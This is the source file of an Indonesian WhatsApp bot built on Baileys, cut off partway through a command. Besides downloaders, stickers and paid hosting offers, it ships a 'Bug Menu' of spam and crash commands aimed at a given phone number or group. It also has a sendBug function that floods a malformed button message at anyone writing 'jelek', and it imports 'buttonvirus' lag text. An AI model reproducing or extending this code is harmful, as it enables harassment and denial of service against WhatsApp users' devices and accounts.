/*
Thanks To
Pembuat Base ( Irfan )
Pengembang Script Bot ( Dims Bot )

Jangan Hapus Thanks To Di Atas
*/

const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys")
const fs = require("fs")
const fsx = require("fs-extra")
const chalk = require("chalk")
const crypto = require("crypto")
const { exec, spawn, execSync } = require("child_process")
const axios = require("axios")
const path = require("path")
const moment = require("moment-timezone")
const fetch = require("node-fetch")
const Jimp = require("jimp")
const ytdl = require("ytdl-core")
const util = require("util")
const PhoneNumber = require("awesome-phonenumber")
const speed = require("performance-now")
const os = require("os")
const syntaxerror = require("syntax-error")
const { Sticker } = require("wa-sticker-formatter")
const { sizeFormatter  } = require("human-readable")
const { button } = require("../../../ACTION/STORAGE/ACC/button")
const { buttonvir } = require("../../../ACTION/STORAGE/ACC/buttonvirus")
const { color, bgcolor } = require("../../../ACTION/STORAGE/ACC/color")
const { addCommands, checkCommands, deleteCommands } = require("../../../ACTION/STORAGE/ACC/autorespon")
const { calender, isUrl, sleep, runtime, fetchJson, getRandom, generateProfilePicture } = require("../../../ACTION/STORAGE/ACC/functions")
const owner = JSON.parse(fs.readFileSync("./ACTION/DATABASE/owner.json"))
const prem = JSON.parse(fs.readFileSync("./ACTION/DATABASE/premium.json"))
const commands = JSON.parse(fs.readFileSync("./ACTION/DATABASE/commands.json"))
const vndb = JSON.parse(fs.readFileSync("./ACTION/DATABASE/dbvn.json"))
//================================================================================\\
module.exports = async (sock, m, chatUpdate, store) => {
try {
const { type, now, fromMe } = m
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const pes = type === 'conversation' && m.message.conversation? m.message.conversation: type == 'imageMessage' && m.message.imageMessage.caption? m.message.imageMessage.caption: type == 'videoMessage' && m.message.videoMessage.caption? m.message.videoMessage.caption: type == 'extendedTextMessage' && m.message.extendedTextMessage.text? m.message.extendedTextMessage.text: ''
const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const messagesC = pes.slice(0).trim()
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const arge = budy.slice(command.length + 2, budy.length)
const pushname = m.pushName || "No Name"
const from = m.key.remoteJid
const botNumber = sock.decodeJid(sock.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.key.fromMe
const isPremium = prem.includes(m.sender)
const text = q = args.join(" ")
const senderNumber = m.sender.split('@')[0]
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const wib = moment.tz("Asia/Jakarta").format("HH:mm:ss")
//================================================================================\\
const groupMetadata = m.isGroup ? await sock.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')

if (!publik && !itsMe && !isCreator) return

if (!isCmd && !m.isGroup) console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mPRIVATE\x1b[1;37m]'), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'green'), color(budy, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (!isCmd && m.isGroup) console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mGROUP\x1b[1;37m]'), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'green'), color(budy, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, 'deeppink'))
if (isCmd && !m.isGroup) console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'green'), color(`${prefix+command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isCmd && m.isGroup) console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'green'), color(`${prefix+command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, 'deeppink'))

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Dims Bot WhatsApp`, 
"jpegThumbnail": thumb
}
}
}

const voll = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: sender }) 
},
"message": {
"pollCreationMessage": {
"name": wm,
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM DARI KAYLA BOT"
	}
],
"selectableOptionsCount": 5
}}}

const reply = async (text) => {
sock.sendMessage(m.chat, { text: text, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
"externalAdReply": {
"renderLargerThumbnail": true,
"title": wm, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": thumb,
"mediaUrl": 'https://wa.me/6281269024490?text=Assalamualaikum+Kakak+Ganteng',
"sourceUrl": 'https://wa.me/6281269024490?text=Assalamualaikum+Kakak+Ganteng'
}}},{quoted:m})
}

const formatp = sizeFormatter({
    std: 'JEDEC', 
    decimalPlaces: 2,
    keepTrailingZeroes: false,
    render: (literal, symbol) => `${literal} ${symbol}B`,
})

const reSize = (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}

const tanggal = (numer) => {
	            myMonths = ["𝖩𝖺𝗇𝗎𝖺𝗋𝗂","𝖥𝖾𝖻𝗋𝗎𝖺𝗋𝗂","𝖬𝖺𝗋𝖾𝗍","𝖠𝗉𝗋𝗂𝗅","𝖬𝖾𝗂","𝖩𝗎𝗇𝗂","𝖩𝗎𝗅𝗂","𝖠𝗀𝗎𝗌𝗍𝗎𝗌","𝖲𝖾𝗉𝗍𝖾𝗆𝖻𝖾𝗋","𝖮𝗄𝗍𝗈𝖻𝖾𝗋","𝖭𝗈𝗏𝖾𝗆𝖻𝖾𝗋","𝖣𝖾𝗌𝖾𝗆𝖻𝖾𝗋"];
				myDays = ['𝖬𝗂𝗇𝗀𝗀𝗎','𝖲𝖾𝗇𝗂𝗇','𝖲𝖾𝗅𝖺𝗌𝖺','𝖱𝖺𝖻𝗎','𝖪𝖺𝗆𝗂𝗌','𝖩𝗎𝗆𝖺𝗍','𝖲𝖺𝖻𝗍𝗎']; 
				var tgl = new Date(numer);
				var day = tgl.getDate()
				bulan = tgl.getMonth()
				var thisDay = tgl.getDay(),
				thisDay = myDays[thisDay];
				var yy = tgl.getYear()
				var year = (yy < 1000) ? yy + 1900 : yy; 
				const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
				let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				return` ° Wib : ${moment.tz('Asia/Jakarta').format('HH : mm : ss')}\n ° Wita : ${moment.tz('Asia/Makassar').format('HH : mm : ss')}\n ° Wit : ${moment.tz('Asia/Jayapura').format('HH : mm : ss')}\n ° Hari : ${thisDay}\n ° Tanggal : ${day}\n ° Bulan : ${myMonths[bulan]}\n ° Tahun : ${year}`
}

const sendBug = async (target) => {
sock.sendMessage(target, {
text: '', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6281269024490`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6281269024490`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6281269024490`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6281269024490`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6281269024490`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6281269024490`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `${prefix}rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `${prefix}x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa`}}]}
)
}

const iyakak = botz[Math.floor(Math.random() * botz.length)]
const ucapbot = fs.readFileSync(iyakak)

const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)

const tdf = tdkramah[Math.floor(Math.random() * tdkramah.length)]
const sopankek = fs.readFileSync(tdf)

const sendvn = (teks) => {
sock.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

for (let anju of vndb) {
if (budy === anju) {
let buffer = fs.readFileSync(`./ACTION/DATABASE/Audio/${anju}.mp3`)
sendvn(buffer)
}
}

if (budy.match(`jelek`)) {
sendBug(sender)
}

const seactionz = [{
title: `Pencet Button Nya Kak`,
rows: [
{title: `${buttonvir}`, rowId: `haleluya`},
]}]
const listMenuMessage = { 
text: `Pencet Button Di Bawah`,
mentions: [sender],
footer: wm,
buttonText: `Lag Gak?`,
sections: seactionz,
listType: 1}

let list = []
for (let i of owner) {
list.push({
displayName: await sock.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await sock.getName(i + '@s.whatsapp.net')}\n
FN:${await sock.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await sock.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: voll })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await sock.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "```Success```", gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

async function stckBulat(metadata, options) {
if (!metadata) return m.reply("Data must be of type string or an instanceof buffer", "StickerError")
let stc = new Sticker(metadata, options)
await stc.build()
return await stc.get()
}

async function SendStick(jid, buffer, packk, authorr, quotet, typee = "full") {
sock.sendMessage(jid, { sticker: await stckBulat(buffer, { pack: packk, author: authorr, animated: true, type: typee, quality: 50}) }, {quoted: quotet})
}

for (var i = 0; i < commands.length ; i++) {
if (budy.toLowerCase() === commands[i].pesan) {
m.reply(commands[i].balasan)
}
}

const seactions = [{
title: `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐃𝐈 𝐁𝐀𝐖𝐀𝐇`,
rows: [
{title: "⊟ ANAK", rowId: ".ceritapendek anak"},
{title: "⊟ BAHASA DAERAH", rowId: ".ceritapendek bahasa daerah"},
{title: "⊟ BAHASA INGGRIS", rowId: ".ceritapendek bahasa Inggris"},
{title: "⊟ BAHASA SUNDA", rowId: ".ceritapendek bahasa sunda"},
{title: "⊟ BUDAYA", rowId: ".ceritapendek budaya"},
{title: "⊟ CINTA", rowId: ".ceritapendek cinta"},
{title: "⊟ CINTA ISLAMI", rowId: ".ceritapendek cinta islami"},
{title: "⊟ CINTA PERTAMA", rowId: ".ceritapendek cinta pertama"},
{title: "⊟ CINTA ROMANTIS", rowId: ".ceritapendek cinta romantis"},
{title: "⊟ CINTA SEDIH", rowId: ".ceritapendek cinta sedih"},
{title: "⊟ CINTA SEGITIGA", rowId: ".ceritapendek cinta segitiga"},
{title: "⊟ CINTA SEJATI", rowId: ".ceritapendek cinta sejati"},
{title: "⊟ GALAU", rowId: ".ceritapendek galau"},
{title: "⊟ GOKIL", rowId: ".ceritapendek gokil"},
{title: "⊟ INSPIRATIF", rowId: ".ceritapendek inspiratif"},
{title: "⊟ JEPANG", rowId: ".ceritapendek jepang"},
{title: "⊟ KEHIDUPAN", rowId: ".ceritapendek kehidupan"},
{title: "⊟ KELUARGA", rowId: ".ceritapendek keluarga"},
{title: "⊟ KISAH NYATA", rowId: ".ceritapendek kisah nyata"},
{title: "⊟ KOREA", rowId: ".ceritapendek korea"},
{title: "⊟ KRISTEN", rowId: ".ceritapendek kristen"},
{title: "⊟ LIBURAN", rowId: ".ceritapendek liburan"},
{title: "⊟ MALAYSIA", rowId: ".ceritapendek malaysia"},
{title: "⊟ MENGHARUKAN", rowId: ".ceritapendek mengharukan"},
{title: "⊟ MISTERI", rowId: ".ceritapendek misteri"},
{title: "⊟ MOTIVASI", rowId: ".ceritapendek motivasi"},
{title: "⊟ NASIHAT", rowId: ".ceritapendek nasihat"},
{title: "⊟ NASIONALISME", rowId: ".ceritapendek nasionalisme"},
{title: "⊟ OLAHRAGA", rowId: ".ceritapendek olahraga"},
{title: "⊟ PATAH HATI", rowId: ".ceritapendek patah hati"},
{title: "⊟ PENANTIAN", rowId: ".ceritapendek penantian"},
{title: "⊟ PENDIDIKAN", rowId: ".ceritapendek pendidikan"},
{title: "⊟ PENGALAMAN PRIBADI", rowId: ".ceritapendek pengalaman pribadi"},
{title: "⊟ PENGORBANAN", rowId: ".ceritapendek pengorbanan"},
{title: "⊟ PENYESALAN", rowId: ".ceritapendek penyesalan"},
{title: "⊟ PERJUANGAN", rowId: ".ceritapendek perjuangan"},
{title: "⊟ PERPISAHAN", rowId: ".ceritapendek perpisahan"},
{title: "⊟ PERSAHABATAN", rowId: ".ceritapendek persahabatan"},
{title: "⊟ PETUALANGAN", rowId: ".ceritapendek petualangan"},
{title: "⊟ RAMADHAN", rowId: ".ceritapendek ramadhan"},
{title: "⊟ REMAJA", rowId: ".ceritapendek remaja"},
{title: "⊟ RINDU", rowId: ".ceritapendek rindu"},
{title: "⊟ ROHANI", rowId: ".ceritapendek rohani"},
{title: "⊟ ROMANTIS", rowId: ".ceritapendek romantis"},
{title: "⊟ SASTRA", rowId: ".ceritapendek sastra"},
{title: "⊟ SEDIH", rowId: ".ceritapendek sedih"},
{title: "⊟ SEJARAH", rowId: ".ceritapendek sejarah"},
]}]
const sendListCerpen = { 
text: `Hai Kak @${sender.split("@")[0]} Silahkan Pencet Button List Di Bawah`,
mentions: [sender],
footer: wm,
buttonText: `PILIH CERPEN`,
sections: seactions,
listType: 1}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

if (simi && !m.isGroup && !isCmd && !m.key.fromMe && !isSticker && !isAudio && !isMedia) {
try {
let randomText = ["Ara Ara Kak","Iy Kak","Ada apa kak","🗿","🐦","Afa iy","Apa","Oh","Ok"]
let fekfj = pickRandom(randomText)
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${body}&lc=id`, { methods: 'GET' })
let sami = simi.success
sock.sendMessage(from, { text: `${sami}` }, { quoted: m }) 
} catch (err) {
console.log(err)
sock.sendMessage(from, { text: `${fekfj}` }, { quoted: m })             
}
}

let seth = await reSize(thumbsewa, 300, 300)

const butlocNye = [
{buttonId: `${prefix}bayar`, buttonText: {displayText: 'PAYMENT'}, type: 1}
]

const buttonLocnya = {
location: { jpegThumbnail: seth } ,
caption: `Hai Kak @${sender.split("@")[0]}
Mau Sewabot? Silahkan List Di Bawah Yah

List Sewabot
15.000/minggu
25.000/bulan
55.000/permanent

Jika Minat Maka Selesaikan Pembayaran Lewat Pencet Button Di Bawah`,
mentions : [sender],
footer: "",
buttons: butlocNye,
headerType: "LOCATION"
}

switch (command) {
case "test":
sendvn(ucapbot)
break
case "owner": {
const repf = await sock.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: voll })
sock.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender], contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "menu": {
let fbbs = [
{ buttonId: '.donasi', buttonText: { displayText: 'Donasi' }, type: 1 },
{ buttonId: '.sewabot', buttonText: { displayText: 'Sewabot' }, type: 1 },
{ buttonId: '.buypanel', buttonText: { displayText: 'Buy Panel' }, type: 1 }
]
let ggh = `Hai Kak @${sender.split("@")[0]}

 ° Nomor Creator : @${creAtor.split("@")[0]}
 ° Nama Creator : ${namaOwner}
 ° Nomor Bot : @${botNumber.split("@")[0]}
 ° Nama Bot : ${namaBot}
 ° Runtime : ${runtime(process.uptime())}
${tanggal(new Date())}

╰────────────˧
╭─▸ 𝑩𝒖𝒈 𝑴𝒆𝒏𝒖
│⭔${prefix}send1 [ nomor ]
│⭔${prefix}send2 [ nomor ]
│⭔${prefix}send3 [ nomor ]
│⭔${prefix}send4 [ nomor ]
│⭔${prefix}send5 [ nomor ]
│⭔${prefix}send6 [ nomor ]
│⭔${prefix}sendtroli [ nomor ]
│⭔${prefix}sendtopc [ nomor ]
│⭔${prefix}spamsantetpc [ nomor ]
│⭔${prefix}spamsantetgc [ linkgroup ]
│⭔${prefix}sendtogc [ linkgroup ]
╰────────────˧


*──────" Dims "──────*`
sock.sendButtonText(from, fbbs, [sender, creAtor, botNumber], ggh, "", m)
}
break
case "sewabot":{
sock.sendMessage(from, buttonLocnya, { quoted : m })
}
break
case "buypanel": case "buypannel":
const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
if (args[0] == "1gb") {
await sock.sendMessage(m.chat, { text: `Pesanan Anda Telah Terkirim Ke Owner Bot Tunggu 1-10 menit Nanti Juga Ada Yang Chat.` }, { quoted: m })
await sock.sendMessage(creAtor,{text:`*❏ ORDER PANEL ❏*
*PAKET :* 10.000 
*RAM :* 1GB 
*CPU :* 25%
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} if (args[0] == "2gb") {
await sock.sendMessage(m.chat, { text: `Pesanan Anda Telah Terkirim Ke Owner Bot Tunggu 1-10 menit Nanti Juga Ada Yang Chat.` }, { quoted: m })
await sock.sendMessage(creAtor,{text:`*❏ ORDER PANEL ❏*
*PAKET :* 15.000 
*RAM :* 2GB 
*CPU :* 50%
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} if (args[0] == "3gb") {
await sock.sendMessage(m.chat, { text: `Pesanan Anda Telah Terkirim Ke Owner Bot Tunggu 1-10 menit Nanti Juga Ada Yang Chat.` }, { quoted: m })
await sock.sendMessage(creAtor,{text:`*❏ ORDER PANEL ❏*
*PAKET :* 20.000 
*RAM :* 3GB 
*CPU :* 75%
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} if (args[0] == "4gb") {
await sock.sendMessage(m.chat, { text: `Pesanan Anda Telah Terkirim Ke Owner Bot Tunggu 1-10 menit Nanti Juga Ada Yang Chat.` }, { quoted: m })
await sock.sendMessage(creAtor,{text:`*❏ ORDER PANEL ❏*
*PAKET :* 25.000 
*RAM :* 4GB 
*CPU :* 100%
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} if (args[0] == "5gb") {
await sock.sendMessage(m.chat, { text: `Pesanan Anda Telah Terkirim Ke Owner Bot Tunggu 1-10 menit Nanti Juga Ada Yang Chat.` }, { quoted: m })
await sock.sendMessage(creAtor,{text:`*❏ ORDER PANEL ❏*
*PAKET :* 30.000 
*RAM :* 5GB 
*CPU :* 130%
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} if (args[0] == "6gb") {
await sock.sendMessage(m.chat, { text: `Pesanan Anda Telah Terkirim Ke Owner Bot Tunggu 1-10 menit Nanti Juga Ada Yang Chat.` }, { quoted: m })
await sock.sendMessage(creAtor,{text:`*❏ ORDER PANEL ❏*
*PAKET :* 35.000 
*RAM :* 6GB 
*CPU :* 150%
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} if (args[0] == "7gb") {
await sock.sendMessage(m.chat, { text: `Pesanan Anda Telah Terkirim Ke Owner Bot Tunggu 1-10 menit Nanti Juga Ada Yang Chat.` }, { quoted: m })
await sock.sendMessage(creAtor,{text:`*❏ ORDER PANEL ❏*
*PAKET :* 40.000 
*RAM :* 7GB 
*CPU :* 170%
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else {
const seactiones = [
{
title: `🔰 RAM 1GB CPU 25% `,
rows: [
{title: `Rp. 10.000 / Bulan`, rowId: `${prefix + command} 1gb`},
]
},
{
title: `🔰 RAM 2GB CPU 50% `,
rows: [
{title: `Rp. 15.000 / Bulan`, rowId: `${prefix + command} 2gb`},
]
},
{
title: `🔰 RAM 3GB CPU 75% `,
rows: [
{title: `Rp. 20.000 / Bulan`, rowId: `${prefix + command} 3gb`},
]
},
{
title: `🔰 RAM 4GB CPU 100% `,
rows: [
{title: `Rp. 25.000 / Bulan`, rowId: `${prefix + command} 4gb`},
]
},
{
title: `🔰 RAM 5GB CPU 130% `,
rows: [
{title: `Rp. 30.000 / Bulan`, rowId: `${prefix + command} 5gb`},
]
},
{
title: `🔰 RAM 6GB CPU 150% `,
rows: [
{title: `Rp. 35.000 / Bulan`, rowId: `${prefix + command} 6gb`},
]
},
{
title: `🔰 RAM 7GB CPU 170% `,
rows: [
{title: `Rp. 40.000 / Bulan`, rowId: `${prefix + command} 7gb`},
]
}
]
const listSw = { 
text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`,
mentions: [sender],
footer: `Mau ${command} ya? Silahkan Pencet Di Bawah Ya Kak`,
buttonText: 'LIST PANEL',
sections: seactiones,
listType: 1}
sock.sendMessage(from, listSw, { quoted: m })
}
break
case "donasi": case "donate": case "bayar":{
sock.sendMessage(from,{ image:qris, caption:`Hai Kak @${sender.split("@")[0]} Mau ${command}?

Silahkan Scan Qris Di Atas Ya Kak
Atau Juga Bisa Isi Nomor Payment Di Bawah Ya
Gopay : ${gopayno}
Dana : ${danano}
Shopeepay : ${shopeepayno}

Jika Sudah Transfer Maka Langsung Aja Chat @${creAtor.split("@")[0]}, Kirim Screenshot Bukti Transfer Untuk Konfirmasi`, mentions: [sender, creAtor],
contextInfo:{
forwardingScore: 99999999999999, 
isForwarded: true,
mentionedJid: [sender]
}},{quoted:voll})
}
break
case "tt": case "tiktok": case "tiktoknowm": case "tiktokmusic": case "tiktokvideo": case "tiktokaudio":{
if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
reply("```Otw Download Sabar Om```")
let res = await tiktok(q)
let ghd = await sock.sendMessage(m.chat,{video:{url: res.media[1].url},caption: "```Sukses Kak Tunggu Aja Audio Nya Di Bawah Yaa```"},{quoted:m})
sock.sendMessage(m.chat,{audio:{url: res.media[2].url}, mimetype: "audio/mp4", ptt:false},{quoted:ghd})
}
break
case "ytmp4": case "mp4":{
if (!text) return reply('Masukan Link Nya!!!')
reply("```Otw Download Sabar Om```")
downloadMp4(text)
}
break
case "ytmp3": case "mp3":{
if (!text) return reply('Masukan Link Nya!!!')
reply("```Otw Download Sabar Om```")
downloadMp3(text)
}
break
case "gitclone":
try {
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return reply('link githubnya mana? contoh: https://github.com/Dims Bot/Baileys')
if (!regex.test(q)) return reply('link salah!')
let [, user, repos] = q.match(regex) || []
let repo = repos.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repos}/zipball`
let filename = (await fetch(url, { method: 'HEAD' })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
reply(`*Mohon tunggu, sedang mengirim repository..*`)
await sock.sendMedia(from, url, m, { fileName: filename })
} catch (err) {
reply(`Masukan Link Yang Benar`)
}
break
case "ping":{
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let used = process.memoryUsage()
let cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
})
let respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
}
break
case "igstalk":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Contoh ${prefix+command} Dims Botx`)
reply("```Stalker Process```")
aj = await stalkig(`${q}`)
sock.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Stalking Instagram \\*

Fullname : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case "ffstalk":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Contoh ${prefix+command} 946716486`)
reply("```Stalker Process```")
eeh = await stalkff(`${q}`)
